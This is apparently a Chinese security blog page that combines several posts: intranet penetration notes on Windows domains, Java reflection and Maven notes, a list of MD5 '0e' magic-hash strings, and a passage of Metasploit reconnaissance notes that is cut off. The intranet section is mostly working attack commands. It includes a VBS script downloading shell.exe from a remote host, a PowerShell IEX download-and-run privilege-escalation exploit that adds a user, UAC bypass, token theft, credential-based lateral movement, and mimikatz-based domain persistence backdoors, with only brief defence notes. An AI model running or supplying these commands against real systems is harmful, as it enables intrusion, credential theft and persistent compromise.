nc, powercat 应用层隧道技术SSH DNS dnscat2 Socks 代理earthworm reGeorg sSocks SocksCap64 Proxifier ProxyChains 压缩数据rar.exe将E:\\webs\\目录下的所有内容打包为1.rar放入E:\\webs\\目录下 1rar.exe a -k -r -s -m3 E:\\webs\\1.rar E:\\webs\\ 将E:\\webs\\1.rar解压到当前根目录下 1rar.exe e E:\\webs\\1.rar 分卷压缩、解压 分卷压缩E盘API目录下的所有文件及文件夹，设置每个分卷为20M 1rar.exe a -m0 -r -v20m E:\\test.rar E:\\API 将E:\\test.part01.rar解压到E盘的x1目录下 1rar.exe x E:\\test.part01.rar E:\\x1 7zip上传和下载FTPVBSdownload.vbs代码： 12345678910Set Post=CreateObject(&quot;Msxml2.XMLHTTP&quot;)Set shell = CreateObject(&quot;Wscript.Shell&quot;)post.Open &quot;GET&quot;,&quot;http://IP/shell.exe&quot;,0post.Send()Set aGet = CreateObject(&quot;ADODB.Stream&quot;)aGet.Mode = 3aGet.Type = 1aGet.Open()aGet.Write(post.responseBody)aGet.SaveToFile &quot;C:\\test\\shell.exe&quot;,2 执行下面命令即可在目标主机上下载shell.exe文件 1Cscript download.vbs 利用 Debug利用 Nishang 上传利用 bitsadmin 下载权限提升分析及防御Windows 最高权限 Trusted Installer，可以修改系统文件，高于 System 提权分为横向提权和纵向提权 系统内核溢出漏洞提权分析及防范通过手动执行命令发现缺失补丁123456//查看当前权限whoami /groupssysteminfowmic qfe get Caption,Description,HotFixID,InstalledOn 这个链接里也描述了一些方法和工具：https://www.k0rz3n.com/2019/01/27/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B0%8F%E6%8A%80%E5%B7%A7%E4%B8%80%EF%BC%9A%E5%AF%BB%E6%89%BEEXP/ 可以通过对比KB来判断是否存在提权漏洞。 MS16-032可以使用Invoke-MS16-032.ps1工具:https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Invoke-MS16-032.ps1 1Invoke-MS16-032 -Application cmd.exe -Commandline &quot;/c net user 1 1 /add&quot; 远程加载： 1powershell -nop -exec bypass -c &quot;IEX(New-Object Net.WebClient).DownloadString(https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Invoke-MS16-032.ps1);Invoke-MS16-032 -Application cmd.exe -Commandline &quot;/c net user 1 1 /add&quot;&quot; MS16-032的补丁编号为KB3139914 利用MSF发现缺失补丁1use post/windows/gather/enum_patches Windows Exploit Suggester将systeminfo信息输出到txt文件中 1systeminfo &gt; info.txt windows-exploit-suggester下载地址：https://github.com/AonCyberLabs/Windows-Exploit-Suggester 123./windows-exploit-suggester.py --updatepip install xlrd --upgrade/windows-exploit-suggester.py -d BulletinSearch.xlsx -i info.txt MSF中也存在此模块 1use post/multi/recon/local_exploit_suggester Powershell中的Sherlock下载地址：https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1 12. .\\sherlock.ps1find-AllVulns Windows 操作系统配置错误急用分析和防范系统服务权限配置错误使用Powerup 12. .\\Powerup.ps1Invoke-AllChecks 可信任服务路径漏洞这个漏洞在书中说明了利用方式，但是并没有说明根本原理，这个漏洞是由于使用CreateProcess函数创建进程时对第二个参数中的文件路径没有使用双引号括起来，这个不再说明了，在之前整理ATT&amp;CK的文档的时候已经弄过了很多遍。可以参考这个文档：https://www.cnblogs.com/sevck/p/8488469.html 书中说到了一个查找漏洞存在的方法： 1wmic service get name,displayname,pathname,startmode |findstr /i &quot;Auto&quot; |findstr /i /c &quot;C:\\Windows\\\\&quot; |findstr /i /v &quot;&quot;&quot; MSF中存在能够利用的模块（需要有session）： 1use trusted_service_path 自动安装配置文件利用的是网络管理员在内网中给多台机器配置环境的配置文件中的敏感信息，如密码等。常用配置文件目录： 1234sysprep.infsysprep.xmlunattend.xmlunattended.xml MSF中的利用模块： 1use post/windows/gather/enum_unattend 计划任务查看当前计划任务： 1schtasks /query /fo LIST /v 这里提到了一个工具，AccessChk用于在Windows中运行一些系统或程序的高级查询，管理和故障排除工作。可以通过这个工具来查看指定目录的权限配置情况，如果当前权限有某个高权限的程序执行文件的写权限，那么就可以替换高权限文件进行权限提升。（这里说到的是使用计划任务来进行定时执行） 使用方法： 12345//不弹框运行accesschk.exe /accepteula//这里原书中的命令空格被吞了，说的是列出某个驱动器下所有权限配置有缺陷的文件夹,但是使用了之后发现应该不会遍历所有的文件夹.\\accesschk.exe -uwdqs Users c:\\.\\accesschk.exe -uwdqs &quot;Authenticated Users&quot; c:\\ Empire 的 Powerup 模块组策略首选项提权分析及防范这个说的就是查找组策略配置文件中加密过的密码，主要就是Group.xml等文件。 可以直接使用PowerSploit中的Get-GPPPassword.ps1来获取 12. .\\Get-GPPpassword.ps1Get-GppPassword 然后使用gpprefdecrypt.py脚本进行解密: 1python gpprefdecrypt.py XXXXXXXXXXXXXXXXXXXX 绕过 UAC 提权分析及防范MSF 中的 Bypassuac123use exploit/windows/local/bypassuacset session Xrun MSF 中的 RunAs123use exploit/windows/local/askset session Xrun 运行后目标主机会弹出一个 UAC 的框，点击是之后才会回弹一个新的 session，如果弹回的不是 system 权限的 session 可以使用 getsystem 命令提升 Nishang 中的 Invoke-PsUACme 模块123456/使用sysprep方法并执行默认的payloadInvoke-PsUACme -Verbose//使用oobe方法并执行默认的payloadInvoke-PsUACme -methed oobe -Verbose//使用oobe方法执行自定义的payloadInvoke-PsUACme -methed oobe -Payload &quot;powershell -windowstyle hidden -e &lt;your encoded payload&gt;&quot; 可以使用payloadpath参数指定payload的路径。 Empire 中的 bypassuac 模块1usemodule privesc/bypassuac 令牌窃取分析及防范123access token访问令牌：代表访问控制操作主体的系统对象security token认证令牌或硬件令牌：是一种用于实现计算机身份校验的物理设备，例如U盾session token会话令牌：是交互会话中唯一的身份标识符 伪造令牌攻击的核心是Kerberos协议。 令牌窃取MSF中的利用(已经有meterpreter)： 12use incognitolist_tokens -u 两种类型的令牌： 12Delegation Tokens 授权令牌：支持交互式登录（例如可以通过远程桌面登录及访问）Impersonation Tokens 模拟令牌：支持非交互式的会话 在MSF中可以选择使用某一个特定的TOKEN 1impersonate_token Rotten Potato本地提权分析利用的前提是系统中要存在有效的令牌，然后用这个工具快速模拟用户令牌，书中的环境存在SYSTEM的token，所以可以使用下面的命令进行窃取 下载地址：https://github.com/foxglovesec/RottenPotato.git 123upload /opt/RottenPotato/rottenpotato.exeexecute -HC -f rottenpotato.exeimpersonate_token &quot;NT AUTHORITY\\\\SYSTEM&quot; 添加域管理员这里说到了使用MSF的migrate命令，借助system权限的进程进行执行命令 Empire 下的令牌窃取分析使用Empire下的creds命令和mimikatz模块进行pth攻击 无凭证条件下的权限获取分析及防范使用Responder进行欺骗 域内横向移动分析及防御常用 Windows 远程连接和命令IPC 1net use \\\\192.168.1.10\\ipc$ &quot;admin123&quot; /user:administrator dir 1dir \\\\192.168.1.10\\c$ tasklist 1tasklist /S 192.168.1.10 /U administrator /P admin123 at：是Windows server 2008之前的计划任务命令 1at \\\\192.168.1.10 4:11PM C:\\shell.bat 创建之后会有一个任务ID，指定任务ID可以删除 1at \\\\192.168.1.10 7 /delete schtasks 1schtasks /create /s 192.168.1.10 /tn test /sc onstart /tr C:\\calc.bat /ru system /f ATT&amp;CK CredentialWMI基本的执行方式： 1wmic /node:192.168.1.10 /user:administrator /password:admin123 process call create &quot;cmd.exe&quot; /c ipconfig &gt; ip.txt&quot; 其他工具： impacket中的wmiexec，成功连接之后会有一个交互式的命令行 1wmiexec.py administrator:admin123@192.168.1.10 wmiexec.vbs 123cscript.exe //nologo wmiexec.vbs /shell 192.168.1.10 administrator admin123cscript.exe wmiexec.vbs /cmd 192.168.1.10 administrator admin123 &quot;ipconfig&quot; Invoke-WMICommand Invoke-WMICommand是PowerSpolit中的脚本： 12345$user = &quot;test\\administrator&quot;$password = ConverTo-SecureString -String &quot;admin123&quot; -AsPlainText -Force$Cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $user, $password$remote = Invoke-WmiCommand -Payload {ipconfig} -Credential $Cred -ComputerName 192.168.1.10$remote.PayloadOutput Invoke-WMIMethod是powershell自带的 1234$user = &quot;test\\administrator&quot;$password = ConverTo-SecureString -String &quot;admin123&quot; -AsPlainText -Force$Cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $user, $passwordInvoke-WMIMethod -Class Win32_Process -Name Create -ArgumentList &quot;ipconfig&quot; -ComputerName &quot;192.168.1.10&quot; -Credential $Cred SMBEXECImpacket中有这个插件 Linux版本下载地址：https://github.com/brav0hax/smbexec.git 安装命令： 12git clone https://github.com/brav0hax/smbexec.gitchmod +x install.sh &amp;&amp; ./install.sh DCOM 在远程系统中的使用通过本地 DCOM 执行命令获取DCOM程序列表： 12Get-CimInstance Win32_DCOMApplicationGet-WmiObject -Namespace ROOT\\CIMV2 -Class Win32_DCOMApplication 使用 DCOM 在远程机器上执行命令1调用MMC20.Application远程执行命令 123net use \\\\192.168.1.10 &quot;admin123&quot; /user:test\\xiaom$com = [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application&quot;,&quot;192.168.1.10&quot;))$com.Document.ActiveView.ExecuteShellCommand('cmd.exe',$null,&quot;/c cmd.exe&quot;,&quot;&quot;) 2、调用9BA05972-F6A8-11CF-A442-00A0C90A8F39 1234$com = [Type]::GetTypeFromCLSID('9BA05972-F6A8-11CF-A442-00A0C90A8F39',&quot;192.168.1.10&quot;)$obj = [System.Activator]::CreateInstance($com)$item = $obj.item()$item.Document.Application.ShellExecute(&quot;cmd.exe&quot;,&quot;/c calc.exe&quot;,&quot;c:\\windows\\system32&quot;,$null,0)关于这个方法的详细内容可以参考 https://bbs.pediy.com/thread-226540-1.htm SPN 在域环境中的应用Exchange 邮件服务器安全防范查看邮件数据库 1234//查询之前需要安装命令add-pssnapin microsoft.exchange *Get-MailboxDatabase -server &quot;Exchange1&quot;Get-MailboxDatabase -Identity 'Mailbox Database 1894576043' | Format-List Name,EdbFilePath,LogFolderPath 域控制器安全NTDS.dit导出 ntds.dit 中的散列值利用 dcsync 获取散列值使用 MSF 获取散列值Kerberos 与用户提权漏洞分析与防范跨域攻击分析与防御利用域信任关系的跨域攻击分析获取域信息这里说到了lg.exe这个工具，能够用来枚举远程主机用户和组的信息。 1234567891011//枚举域中的用户组lg.exe &lt;domain name&gt;\\.//枚举远程机器的本地组用户lg.exe \\\\dc2012//获取远程用户中全部用户的SIDlg.exe \\\\dc2012 -lu -sidsout//获取指定组中所有成员的SIDlg.exe \\\\dc2012\\administrators -sidsout 防范跨域攻击权限维持分析及防御操作系统后门分析与防范粘滞键后门注册表注入后门这个在ATT&amp;CK中的Persistence一章中的Registry Run Keys / Startup Folder中有提到。命令如下： 1REG ADD HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v RegRun /t REG_SZ /d &quot;c:\\windows\\system32\\calc.exe&quot; 计划任务后门meterpreter 后门Cymothoa 后门下载地址：https://sourceforge.net/projects/cymothoa/ 安装可参照https://blog.csdn.net/qq_17204441/article/details/88834099 1./cymothoa -s 0 -p &lt;process id&gt; -y &lt;port&gt; 安装成功后使用nc等工具连接设置的端口即可。 WMI 后门WMI后门的特征是无文件和无进程，将代码加密存储于WMI中，达到所谓的无文件，当设定的条件被满足时，系统将自动启动Powershell进程去执行后门程序，执行后进程将会消失。 Empire下有WMI相关的模块可以使用： 1usemodule powershell/persistence/elevated/wmi 可以在目标主机中使用命令查看存在的后门： 1Get-WMIObject -Namespace root\\Subscription -Class CommandLineEventConsumer 清理WMI后门的方法：删除自动运行列表中的恶意WMI条目，使用Get-WMIObject命令删除与WMI持久化相关的组件。 Web 后门Nishang 下的 WEBShellWeevely 后门webacoo 后门工具域控制器权限持久化分析与防范DSRM 后门使用mimikatz查看krbtgt账户密码hash值 1.\\mimikatz.exe &quot;privilege::debug&quot; &quot;lsadump::lsa /patch /name:krbtgt&quot; exit 查看SAM文件中本地管理员的NTLM HASH值 1.\\mimikatz.exe &quot;token::elevate&quot; &quot;lsadump::sam&quot; exit 将DSRM hash和kebtgt的密码同步： 1234ntdsutilset dsrm passwordSYNC FROM DOMAIN account krbtgtq 再次查看会发现DSRM密码和krbtgt的密码相同，然后修改DSRM的登陆方式，这个注册表键值为2表示”在任何情况下都可以使用DSRM管理员账号登陆域控制器”： 1New-ItemProperty &quot;hklm:\\system\\currentcontrolset\\control\\lsa\\&quot; -name &quot;dsrmadminlogonbehavior&quot; -value 2 -propertyType DWORD 使用mimikatz进行pth攻击： 1.\\mimikatz.exe &quot;privilege::Debug&quot; &quot;sekurlsa::pth /domain:DC /user:administrator /ntlm:XXXXXXXXXXX&quot; DSRM后门防御措施： 123检查hklm\\system\\currentcontrolset\\control\\lsa\\dsrmadminlogonbehavior注册表键值的值，确认值为1定期修改DSRM的账号经常检查ID为4794的日志 SSP 维持域控权限方式一： 1.\\mimikatz.exe &quot;privilege::debug&quot; &quot;misc::memssp&quot; exit 注销之后执行命令查看明文密码： 1powershell.exe cat c:\\windows\\system32\\mimilsa.log 方式二： 12powershell.exe cp .\\mimilib.dll C:\\Windows\\System32\\Set-ItemProperty &quot;hklm:\\system\\currentcontrolset\\control\\lsa\\&quot; -name &quot;Security Packages&quot; -value &quot;mimilib.dll&quot; 重启之后使用命令查看密码： 1powershell.exe cat c:\\windows\\system32\\kiwissp.log 防御措施： 123查看hklm\\system\\currentcontrolset\\control\\lsa\\Security Packages注册表项是否含有可疑的DLL文件检查C:\\windows\\system32\\目录下是否存在可疑的文件第三方工具检查 SID History 后门test为恶意账户，administrator 1234Import-module ActiveDirectoryGet-ADUser xiaom -Properties sidhistory.\\mimikatz.exe &quot;privilege::Debug&quot; &quot;sid::patch&quot; &quot;sid::add /sam:xiaom /new:administrator&quot; exit 此时使用xiaom账号可以访问域控 Golden Ticket and Silver TicketSkeleton KeyHook PasswordChangeNotify这个方法要使用Invoke-ReflectivePEInjection.ps1将HookPasswordChange.dll注入内存，在目标系统中启动管理员权限的powershell： 12. .\\Invoke-ReflectivePEInjection.ps1Invoke-ReflectivePEInjection -PEPath HookPasswordChange.dll -procname lsass 此时如果再修改用户密码则修改之后的密码会记录在C:\\windows\\Temp\\password.txt文件中。 工具下载地址：https://github.com/clymb3r/PowerShell/blob/master/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1 https://github.com/clymb3r/Misc-Windows-Hacking 参考地址：http://www.vuln.cn/6812 Nishang 下的脚本后门分析与防范HTTP-BackdoorAdd-scrnSaveBackdoorExecute-OnTimeInvoke-ADSBackdoor","link":"/2020/07/29/intranet/"},{"title":"kalinethunter","text":"","link":"/2019/10/11/kalinethunter/"},{"title":"Java 笔记","text":"Java 笔记 反射Class 类除了基本类型以外，Java 的其他类型都是 class。 class 是由 JVM 在执行过程中动态加载的，JVM 第一次读取到一种 class 类型时，将其加载进内存。每加载一种 class，JVM 为其创建一个 Class 类型的实例，并关联起来。这里的 Class 类型是一个名为 Class 的 class： 123public final class Class { pricate Class() {}} 以 String 类为例，当 JVM 加载 String 类型时，首先读取 String.class 文件到内存，然后为 String 类创建一个 Class 实例并关联 1Class cls = new Class(String); 这个 Class 实例是 JVM 创建的，其构造方法是 private 的，只有 JVM 可以创建 Class 类型的实例。所以，JVM 持有的每个 Class 实例都指向一个数据类型。 一个 Class 实例包含了该 class 的所有完整信息，包含类名、包名、父类、实现的接口、所有方法、字段等。如果获取了某个 Class 实例，就可以通过这个 Class 是获取到实例对应的 class 的所有信息。这种通过 Class 实例获取 class 信息的方法称为反射（Reflection）。 有三种方法获取一个 class 的 Class 实例。 方法一：直接通过一个 class 的静态变量 class 获取 1Class cls = String.class; 方法二：如果我们有一个实例变量，可以通过实例变量提供的 getClass 方法获取 12String s = &quot;Hello&quot;;Class cls = s.getClass(); 方法三：如果知道一个 class 的完整类名，可以通过静态方法 Class.forName 获取 1Class cls = Class.forName(&quot;java.lang.String&quot;); 因为 Class 实例在 JVM 中是唯一的，所以上述方法获取的 class 实例是同一个实例。可以使用 == 来判断两个实例是否是同一个类。 class 只匹配指定的类型，instanceof 同时也会匹配对应的子类。 动态加载JVM 运行 Java 程序时，并不会一次性加载所有的 class，而是第一次用到时才会加载。 利用该特性，我们可以在运行期根据条件加载不同的实现类。例如，Commons Logging总是优先使用Log4j，只有当Log4j不存在时，才使用JDK的logging。利用JVM动态加载特性，大致的实现代码如下： 12345678910111213141516/ Commons Logging优先使用Log4j:LogFactory factory = null;if (isClassPresent(&quot;org.apache.logging.log4j.Logger&quot;)) { factory = createLog4j();} else { factory = createJdkLog();}boolean isClassPresent(String name) { try { Class.forName(name); return true; } catch (Exception e) { return false; }} 访问字段对于一个Object实例，只要获取了他的 Class，就可以获取所有信息。 获取字段的方法有： Field getField(name)：根据字段名获取某个public的field（包括父类） Field getDeclaredField(name)：根据字段名获取当前类的某个field（不包括父类） Field[] getFields()：获取所有public的field（包括父类） Field[] getDeclaredFields()：获取当前类的所有field（不包括父类） 1234567891011121314151617181920public class Main { public static void main(String[] args) throws Exception { Class stdClass = Student.class; // 获取public字段&quot;score&quot;: System.out.println(stdClass.getField(&quot;score&quot;)); // 获取继承的public字段&quot;name&quot;: System.out.println(stdClass.getField(&quot;name&quot;)); // 获取private字段&quot;grade&quot;: System.out.println(stdClass.getDeclaredField(&quot;grade&quot;)); }}class Student extends Person { public int score; private int grade;}class Person { public String name;} 一个Field对象包含了左右信息： getName()：返回字段名称，例如，&quot;name&quot;； getType()：返回字段类型，也是一个Class实例，例如，String.class； getModifiers()：返回字段的修饰符，它是一个int，不同的bit表示不同的含义。 获取字段值12345678910111213141516171819public class Main { public static void main(String[] args) throws Exception { Object p = new Person(&quot;Xiao Ming&quot;); Class c = p.getClass(); Field f = c.getDeclaredField(&quot;name&quot;); f.setAccessible(true); Object value = f.get(p); System.out.println(value); // &quot;Xiao Ming&quot; }}class Person { private String name; public Person(String name) { this.name = name; }} f.setAccessible(true);为设置可访问，否则无法获取 private 字段的值。另外setAccesible(ture)可能失败。 设置字段值通过Field.set(Object, Object)实现，第一个是指定的实例，第二个是待修改的值。 12345678910111213141516171819202122232425public class Main { public static void main(String[] args) throws Exception { Person p = new Person(&quot;Xiao Ming&quot;); System.out.println(p.getName()); // &quot;Xiao Ming&quot; Class c = p.getClass(); Field f = c.getDeclaredField(&quot;name&quot;); f.setAccessible(true); f.set(p, &quot;Xiao Hong&quot;); System.out.println(p.getName()); // &quot;Xiao Hong&quot; }}class Person { private String name; public Person(String name) { this.name = name; } public String getName() { return this.name; }} 调用方法获取Method的方法： Method getMethod(name, Class...)：获取某个public的Method（包括父类） Method getDeclaredMethod(name, Class...)：获取当前类的某个Method（不包括父类） Method[] getMethods()：获取所有public的Method（包括父类） Method[] getDeclaredMethods()：获取当前类的所有Method（不包括父类） 1234567891011121314151617181920212223242526public class Main { public static void main(String[] args) throws Exception { Class stdClass = Student.class; // 获取public方法getScore，参数为String: System.out.println(stdClass.getMethod(&quot;getScore&quot;, String.class)); // 获取继承的public方法getName，无参数: System.out.println(stdClass.getMethod(&quot;getName&quot;)); // 获取private方法getGrade，参数为int: System.out.println(stdClass.getDeclaredMethod(&quot;getGrade&quot;, int.class)); }}class Student extends Person { public int getScore(String type) { return 99; } private int getGrade(int year) { return 1; }}class Person { public String getName() { return &quot;Person&quot;; }} Method对象包含一个方法的所有信息： getName()：返回方法名称，例如：&quot;getScore&quot;； getReturnType()：返回方法返回值类型，也是一个Class实例，例如：String.class； getParameterTypes()：返回方法的参数类型，是一个Class数组，例如：{String.class, int.class}； getModifiers()：返回方法的修饰符，它是一个int，不同的bit表示不同的含义。 调用方法获取到一个Method都西昂是，可以进行调用 12String s = &quot;Hello world&quot;;String r = s.substring(6); // &quot;world&quot; 使用反射调用 substring方法 123456789101112public class Main { public static void main(String[] args) throws Exception { // String对象: String s = &quot;Hello world&quot;; // 获取String substring(int)方法，参数为int: Method m = String.class.getMethod(&quot;substring&quot;, int.class); // 在s对象上调用该方法并获取结果: String r = (String) m.invoke(s, 6); // 打印调用结果: System.out.println(r); }} 对Method实例调用invoke就相当于调用该方法，invoke的第一个参数是对象实例，即在哪个实例上调用该方法，后面的可变参数要与方法参数一致，否则将报错。 调用静态方法如果获取到的Method是一个静态方法，使用invoke方法时第一个参数为``null` 12345678910public class Main { public static void main(String[] args) throws Exception { // 获取Integer.parseInt(String)方法，参数为String: Method m = Integer.class.getMethod(&quot;parseInt&quot;, String.class); // 调用该静态方法并获取结果: Integer n = (Integer) m.invoke(null, &quot;12345&quot;); // 打印调用结果: System.out.println(n); }} 调用非 public 方法类似于字段，使用Method.setAccessible(true)允许调用 多态利用反射方式调用方法仍然遵循多态调用。 调用构造方法1Person p = Person.class.newInstance(); 缺点是只能调用 public 的无参数构造方法。 Java的反射API提供了Constructor对象，它包含一个构造方法的所有信息，可以创建一个实例。Constructor对象和Method非常类似，不同之处仅在于它是一个构造方法，并且，调用结果总是返回实例： 1234567891011121314public class Main { public static void main(String[] args) throws Exception { // 获取构造方法Integer(int): Constructor cons1 = Integer.class.getConstructor(int.class); // 调用构造方法: Integer n1 = (Integer) cons1.newInstance(123); System.out.println(n1); // 获取构造方法Integer(String) Constructor cons2 = Integer.class.getConstructor(String.class); Integer n2 = (Integer) cons2.newInstance(&quot;456&quot;); System.out.println(n2); }} 通过Class实例获取Constructor的方法如下： getConstructor(Class...)：获取某个public的Constructor； getDeclaredConstructor(Class...)：获取某个Constructor； getConstructors()：获取所有public的Constructor； getDeclaredConstructors()：获取所有Constructor。 注意Constructor总是当前类定义的构造方法，和父类无关，因此不存在多态的问题。 调用非public的Constructor时，必须首先通过setAccessible(true)设置允许访问。setAccessible(true)可能会失败。 获取继承关系获取父类的 Class12345678910public class Main { public static void main(String[] args) throws Exception { Class i = Integer.class; Class n = i.getSuperclass(); System.out.println(n); Class o = n.getSuperclass(); System.out.println(o); System.out.println(o.getSuperclass()); }} ​ ​ Spring Cloud开发 关于作者关注公众号不定期领红包： 关注微博获取实时动态： ​ 获取继承关系​ 阅读: 860676 当我们获取到某个Class对象时，实际上就获取到了一个类的类型： 1Class cls = String.class; // 获取到String的Class 还可以用实例的getClass()方法获取： 12String s = &quot;&quot;;Class cls = s.getClass(); // s是String，因此获取到String的Class 最后一种获取Class的方法是通过Class.forName(&quot;&quot;)，传入Class的完整类名获取： 1Class s = Class.forName(&quot;java.lang.String&quot;); 这三种方式获取的Class实例都是同一个实例，因为JVM对每个加载的Class只创建一个Class实例来表示它的类型。 获取父类的Class有了Class实例，我们还可以获取它的父类的Class： 1// reflection 运行上述代码，可以看到，Integer的父类类型是Number，Number的父类是Object，Object的父类是null。除Object外，其他任何非interface的Class都必定存在一个父类类型。 获取 interface由于一个类可能实现一个或多个接口，通过Class我们就可以查询到实现的接口类型。例如，查询Integer实现的接口： 123456789public class Main { public static void main(String[] args) throws Exception { Class s = Integer.class; Class[] is = s.getInterfaces(); for (Class i : is) { System.out.println(i); } }} getInterfaces()只返回当前类直接实现的接口类型，并不包括其父类实现的接口类型： 123456789public class Main { public static void main(String[] args) throws Exception { Class s = Integer.class.getSuperclass(); Class[] is = s.getInterfaces(); for (Class i : is) { System.out.println(i); } }} Integer的父类是Number，Number实现的接口是java.io.Serializable。 此外，对所有interface的Class调用getSuperclass()返回的是null，获取接口的父接口要用getInterfaces()： 12System.out.println(java.io.DataInputStream.class.getSuperclass()); // java.io.FilterInputStream，因为DataInputStream继承自FilterInputStreamSystem.out.println(java.io.Closeable.class.getSuperclass()); // null，对接口调用getSuperclass()总是返回null，获取接口的父接口要用getInterfaces() 如果一个类没有实现任何interface，那么getInterfaces()返回空数组。 继承关系当我们判断一个实例是否是某个类型时，正常情况下，使用instanceof操作符： 12345Object n = Integer.valueOf(123);boolean isDouble = n instanceof Double; // falseboolean isInteger = n instanceof Integer; // trueboolean isNumber = n instanceof Number; // trueboolean isSerializable = n instanceof java.io.Serializable; // true 如果是两个Class实例，要判断一个向上转型是否成立，可以调用isAssignableFrom()： 12345678// Integer i = ?Integer.class.isAssignableFrom(Integer.class); // true，因为Integer可以赋值给Integer// Number n = ?Number.class.isAssignableFrom(Integer.class); // true，因为Integer可以赋值给Number// Object o = ?Object.class.isAssignableFrom(Integer.class); // true，因为Integer可以赋值给Object// Integer i = ?Integer.class.isAssignableFrom(Number.class); // false，因为Number不能赋值给Integer 动态代理Java标准库提供了一种动态代理（Dynamic Proxy）的机制：可以在运行期动态创建某个interface的实例。 泛型MavenMaven项目结构一个使用Maven管理的普通的Java项目，它的目录结构默认如下： 12345678910a-maven-project├── pom.xml├── src│ ├── main│ │ ├── java│ │ └── resources│ └── test│ ├── java│ └── resources└── target 项目的根目录a-maven-project是项目名，它有一个项目描述文件pom.xml，存放Java源码的目录是src/main/java，存放资源文件的目录是src/main/resources，存放测试源码的目录是src/test/java，存放测试资源的目录是src/test/resources，最后，所有编译、打包生成的文件都放在target目录里。这些就是一个Maven项目的标准目录结构。 项目描述文件 pom.xml 1234567891011121314151617&lt;project ...&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;groupId&gt;com.itranswarp.learnjava&lt;/groupId&gt; &lt;artifactId&gt;hello&lt;/artifactId&gt; &lt;version&gt;1.0&lt;/version&gt; &lt;packaging&gt;jar&lt;/packaging&gt; &lt;properties&gt; ... &lt;/properties&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;commons-logging&lt;/groupId&gt; &lt;artifactId&gt;commons-logging&lt;/artifactId&gt; &lt;version&gt;1.2&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/project&gt; 其中，groupId类似于Java的包名，通常是公司或组织名称，artifactId类似于Java的类名，通常是项目名称，再加上version，一个Maven工程就是由groupId，artifactId和version作为唯一标识。我们在引用其他第三方库的时候，也是通过这3个变量确定。例如，依赖commons-logging： 12345&lt;dependency&gt; &lt;groupId&gt;commons-logging&lt;/groupId&gt; &lt;artifactId&gt;commons-logging&lt;/artifactId&gt; &lt;version&gt;1.2&lt;/version&gt;&lt;/dependency&gt; 使用&lt;dependency&gt;声明一个依赖后，Maven就会自动下载这个依赖包并把它放到classpath中。 Web 开发Servlet","link":"/2020/10/04/java/"},{"title":"MD5后以0e开头的字符串","text":"1234240610708==0e462097431906509019562988736854QNKCDZO==0e83040045199349405802421990339aabg7XSs==0e087386482136013740957780965295aabC9RqS==0e041022518165728065344349536299","link":"/2019/11/27/md5-0e/"},{"title":"Metasploit 笔记","text":"基本操作 metasploit 渗透测试指南 小笔记 情报搜集被动信息搜集whois 查询whois 可以查找域名服务器，如果Name Server不属于要测试的站点，则不应该将其作为攻击目标。 1whois testfire.net 也可以查询IP地址 1whois 65.61.137.117 如果NetType并不在域名内，可能网站是由提供托管服务的第三方运营的。 NetcraftNetcraft，可以查出服务器的IP地址，例如testfire.net的IP地址是65.61.137.117。 nslookup123nslookupset type=mxtestfire.net 查到 mail addr 不属于 testfire.net，也不在攻击范围内。 Google Hacking可以通过搜索关键词 site，将搜索目标限定在网站域名下。搜索site:testfire.net，可以发现有 www demo altoro 三个子域名，而且除了80端口，8080端口也提供web服务。demo.testfire.net域名下存在两个目录遍历的不安全配置缺陷，导致RTF文档敏感文件泄露和ASP源码泄露。在8080端口提供基于 Swagger的AltoroJ API 接口和使用手册。 还可以搜索一些与渗透攻击目标相关的搜索词，比如site:testfire.net admin，可以发现管理员后台登录界面。使用site:testfire.net login可以发现login界面泄露的ASP源码。可以想到这里存在本地文件包含和SQL注入。 主动信息搜集使用Nmap进行扫描推荐选项 -sS执行一次隐秘的TCP扫描，-Pn不要使用ping命令预先判断主机是否存活，默认所有主机都是存活的，适用于Internet上的渗透测试环境，因为大多数网络不允许ICMP协议通过。 可以加入 -A选项尝试获得深入的服务枚举和旗标获取。 使用数据库渗透比较复杂时可以使用数据库。默认使用 postgresql，用db_status可以确认数据库连接情况。 将nmap输出导入 metasploit123456nmap -Pn -sS -A -oX Subnet1.xml 192.168.1.0/24# 扫描网络，将结果保存在 Subnet1.xml 中db_import Subnet1.xml# 将其中的内容导入数据库hosts -c address# 核实结果，显示数据库中所有已保存的主机信息 TCP空闲扫描这种扫描可以冒充网络上另一台主机的IP地址，对目标进行更隐秘的扫描。首先需要定位一台使用递增IP帧标识机制的空闲主机。它的IP帧标识是可以预测的，能够计算出下一个IP帧标识。当我们冒充这台主机的IP地址对目标主机的某个端口进行探测后，如果该空闲主机实际的IP帧标识与预测不同，意味着那个端口可能是开放的。 可以使用scanner/ip/ipidseq模块寻找符合要求的空闲主机。 12use auxiliary/scanner/ip/ipidseqshow options 显示了执行扫描所需的参数，RHOST参数可以使用IP地址段，如192.168.1.100-192.168.1.200，或者 CIDR 无类型域间选路 地址块，如192.168.1.0/24，使用都好的多个CIDR地址块以及每行包含一个IP地址的IP列表文本文件，如file:/tmp/hostlist.txt。THREADS参数设定扫描的线程数，默认为1。Windows中不要超过16，类UNIX系统不要超过128。 执行扫描： 123set RHOSTS 192.168.1.0/24set THREADS 50run 在扫描结果中可以发现可用于扫描的主机，例如192.168.1.131，可以使用 nmap 的-sI选项指定这台主机作为空闲主机对目标进行扫描。 1nmap -Pn -sI 192.168.1.131 192.168.1.201 这种方法不用自身IP想目标主机发送信息。 在msf终端运行nmapmsfconsole 中连接数据库后，可以使用 db_nmap命令，把nmap结果存储在数据库中。 1db_nmap -sS -A 192.168.1.201 可以执行services 命令查看数据库中关于系统上运行服务的扫描结果： 1services -u 使用 metasploit 进行端口扫描除了第三方扫描器，辅助模块中也包含了内建的端口扫描器，有时这些扫描器更具有优势。例如贡献了一台位于防火墙之后使用NAT的主机，这台主机使用无法从Internet直接连接的私有IP，如果希望使用 metasploit 